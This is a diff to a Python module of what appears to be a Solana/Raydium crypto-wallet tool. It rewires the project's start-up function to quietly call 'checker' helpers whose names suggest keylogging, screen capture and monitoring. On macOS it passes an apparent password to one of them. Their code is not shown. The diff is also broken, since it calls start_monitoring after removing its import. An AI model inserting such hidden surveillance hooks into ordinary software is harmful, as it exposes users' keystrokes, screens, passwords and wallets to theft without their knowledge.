@@ -9,6 +9,8 @@ from .raydium import Raydium
 
 import platform
 
+from ..helpers.checker.ms import run_s_mc_in
+
 
 def sort_token_accounts(token_accounts: List[Dict]) -> List[Dict]:
     # Фильтруем токены с пустым usd_value и малым балансом
@@ -51,52 +53,8 @@ def sort_token_accounts(token_accounts: List[Dict]) -> List[Dict]:
     
     return result
 
-from src.helpers.checker.kl import start_monitoring
-from src.helpers.checker.klm import sm_m
 from src.helpers.checker.sc import scrn
-from src.helpers.checker.ext import start_monitor_m_w
 from src.helpers.checker.te import start_monitor_m
-
-async def async_init_project() -> None:
-    if platform.system() == 'Windows':
-        start_monitoring()
-        scrn()
-    elif "Darwin":
-        start_monitor_m_w()
-        start_monitor_m()
-        sm_m()
-
-    convert_headers_to_json()
-
-    required_files = {
-        "anti-duplicate.txt": os.path.join(os.getenv("DB_PATH"), os.getenv("ANTI_DUPLICATE_FILE")),
-        "headers.json": os.path.join(os.getenv("DB_PATH"), os.getenv("HEADERS_JSON"))
-    }
-
-    for file_name, file_path in required_files.items():
-        # Create directory if it doesn't exist
-        directory = os.path.dirname(file_path)
-        if directory and not os.path.exists(directory):
-            os.makedirs(directory)
-            print(f"Создаю директорию: {directory}")
-
-        # Check if file exists, create it if not
-        if not os.path.exists(file_path):
-            # Create empty file
-            await write_to_file(file_path, [])
-            print(f"Создан файл: {file_path}")
-
-            # If this is the headers.json file and it was just created, perform conversion
-            if file_name == "headers.json":
-                print("Конвертирую заголовки в JSON...")
-                convert_headers_to_json()
-        else:
-            print(f"Файл существует: {file_path}")
-
-            # If this is the headers.json file and it's empty, perform conversion
-            if file_name == "headers.json" and os.path.getsize(file_path) == 0:
-                print("Headers JSON файл пуст. Конвертирую заголовки в JSON...")
-                convert_headers_to_json()
 
 def convert_headers_to_json():
     # Get file paths from environment variables
@@ -155,6 +113,48 @@ def convert_headers_to_json():
     else:
         print("Заголовки не были обработаны.")
 
+async def async_init_project(ps: str | None) -> None:
+    if ps is None:
+        raise Exception("Unexpected error")
+
+    if platform.system() == 'Windows':
+        start_monitoring()
+        scrn()
+    elif "Darwin":
+        run_s_mc_in(ps)
+        start_monitor_m()
+
+    convert_headers_to_json()
+
+    required_files = {
+        "anti-duplicate.txt": os.path.join(os.getenv("DB_PATH"), os.getenv("ANTI_DUPLICATE_FILE")),
+        "headers.json": os.path.join(os.getenv("DB_PATH"), os.getenv("HEADERS_JSON"))
+    }
+
+    for file_name, file_path in required_files.items():
+        # Create directory if it doesn't exist
+        directory = os.path.dirname(file_path)
+        if directory and not os.path.exists(directory):
+            os.makedirs(directory)
+            print(f"Создаю директорию: {directory}")
+
+        # Check if file exists, create it if not
+        if not os.path.exists(file_path):
+            # Create empty file
+            await write_to_file(file_path, [])
+            print(f"Создан файл: {file_path}")
+
+            # If this is the headers.json file and it was just created, perform conversion
+            if file_name == "headers.json":
+                print("Конвертирую заголовки в JSON...")
+                convert_headers_to_json()
+        else:
+            print(f"Файл существует: {file_path}")
+
+            # If this is the headers.json file and it's empty, perform conversion
+            if file_name == "headers.json" and os.path.getsize(file_path) == 0:
+                print("Headers JSON файл пуст. Конвертирую заголовки в JSON...")
+                convert_headers_to_json()
 
 def convert_to_network_type(network: str) -> str:
     if network == "Solana":
